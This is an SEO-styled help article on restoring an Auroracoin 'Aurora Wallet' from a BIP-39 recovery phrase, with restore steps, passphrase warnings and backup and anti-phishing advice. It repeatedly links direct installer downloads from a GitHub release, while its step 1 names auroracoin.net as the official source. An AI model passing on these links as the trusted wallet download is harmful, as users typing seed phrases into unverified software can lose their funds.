---
title: "Restore Aurora Wallet with 12 or 24 Word BIP-39 Phrase"
description: "Learn how to restore your Auroracoin balance using a BIP-39 recovery phrase. Follow our guide on seed word security, checksums, and address paths."
primary_keyword: "auroracoin recovery phrase"
silo: "recovery"
updated: 2026-10-10
---

![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

# Restore Aurora Wallet from a 12 or 24-Word Recovery Phrase

Restoring an Aurora Wallet using a recovery phrase is the standard procedure for reclaiming access to your Auroracoin (AUR) balance on a new device. Unlike legacy software that required the management of individual files, modern Aurora Wallet implementations utilize the BIP-39 standard to convert a human-readable list of 12 or 24 English words into a complete set of deterministic private keys. This means your funds are not tied to a specific computer or piece of hardware, but rather to the specific sequence of words you recorded during the initial setup process.

## You'll see this if

*   You have lost access to your original computer and need to reinstall Aurora Wallet.
*   You are migrating from a mobile or browser wallet that provided you with a 12-word seed.
*   You are performing a security test to ensure your physical backups are correct.
*   You are following the [Auroracoin wallet seed phrase](https://auroracoin.net/recovery/seed-phrase) guide to recover funds after a software crash.
*   You have purchased a new computer and want to "move" your existing wallet.

## Why this happens

Recovery phrases work by utilizing a standardized word list (BIP-39) to represent a large random number (entropy). This entropy is then used to derive every single private key and address your wallet will ever use via a mathematical "derivation path." For Auroracoin, this path is typically fixed (e.g., BIP-44 path `m/44'/85'/0'/0`), ensuring that no matter which compatible software you use, your addresses remain consistent.

The restoration process is necessary because Aurora Wallet does not store your private keys in the cloud. They exist only on your device, encrypted by your password. If the device fails, the recovery phrase is the only way to recreate those keys and scan the blockchain for your historical transactions.

## The fix

Follow these steps to restore your wallet accurately and securely.

### 1. Preparation and Privacy
Ensure you are in a secure, private location. Close any screen-sharing applications (like Zoom or Teams) and check that no cameras are visible. Download the official Aurora Wallet from the [official download page](https://auroracoin.net/download) and verify it.

### 2. Enter Restoration Mode
Launch the application. On the initial welcome screen, select **"Restore an existing wallet"** rather than "Create a new wallet."

### 3. Choose Phrase Length
Select the option that matches your backup: either 12 words or 24 words. Entering a 12-word phrase into a 24-word interface will result in an error.

### 4. Input the Words
Type each word carefully into the numbered boxes. 
*   Aurora Wallet is designed to offer auto-complete suggestions.
*   If you type "app", it will suggest "apple" or "apply".
*   Ensure the words are in the exact order they were written on your backup paper.

### 5. Check for Passphrase (Optional)
If you originally set a "25th word" or a BIP-39 passphrase, you must enter it now. If you did not use this feature, leave the field blank.
> [!WARNING]
> Entering a passphrase when you didn't have one (or typing the wrong passphrase) will generate a perfectly valid but completely empty wallet.

### 6. Blockchain Synchronization
Once the phrase is accepted, the wallet will begin scanning the Auroracoin blockchain. This process involves looking at thousands of blocks to find transactions associated with your derived addresses. Your balance will update as the scan progresses.

## If that didn't work

If the software reports an "Invalid Phrase" error, one of your words is likely misspelled or not part of the standard BIP-39 list. Check your words against the official list of 2,048 English words. If the phrase is accepted but the balance is zero, you likely used a different derivation path in your old wallet or entered the wrong optional passphrase. See the [33-backup-best-practice.md](33-backup-best-practice.md) guide for how to verify historical backups.

## Prevention

To ensure you never lose access to your funds in the future:

*   **Physical Backups:** Store your phrase on paper or metal. Never store it in a digital format, such as a photo or a cloud-synced notes app.
*   **Multiple Locations:** Keep two copies of your phrase in separate, secure physical locations (e.g., a home safe and a safety deposit box).
*   **Anti-Phishing awareness:** Never type your recovery phrase into a website or read it to anyone claiming to be "support." Refer to the [35-phishing-seed-scams.md](35-phishing-seed-scams.md) guide for scam prevention.
*   **Self-Custody Education:** Understand that you, and only you, are responsible for your keys. Review the [36-self-custody-basics.md](36-self-custody-basics.md) article for more information.

## FAQ

**Can I restore a 12-word phrase into a 24-word wallet?**
Yes, Aurora Wallet is designed to support both formats. However, you must select the correct input mode before typing the words.

**What happens if I lose my recovery phrase?**
If you lose both your recovery phrase and your wallet password/access to the original device, your funds are permanently lost. There is no central authority that can reset your phrase.

**Is it safe to type my phrase on my computer?**
It is only safe to type your phrase into the official, verified Aurora Wallet application. Never type it into a web browser or any other third-party software.

**How long does the restoration scan take?**
Typically, the scan takes between 2 and 10 minutes depending on your internet connection and the number of transactions in your wallet's history.

---

## The current release

Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)

## Related articles

- [33-backup-best-practice.md](33-backup-best-practice.md)
- [35-phishing-seed-scams.md](35-phishing-seed-scams.md)
- [36-self-custody-basics.md](36-self-custody-basics.md)
- [38-aurora-wallet-faq.md](38-aurora-wallet-faq.md)
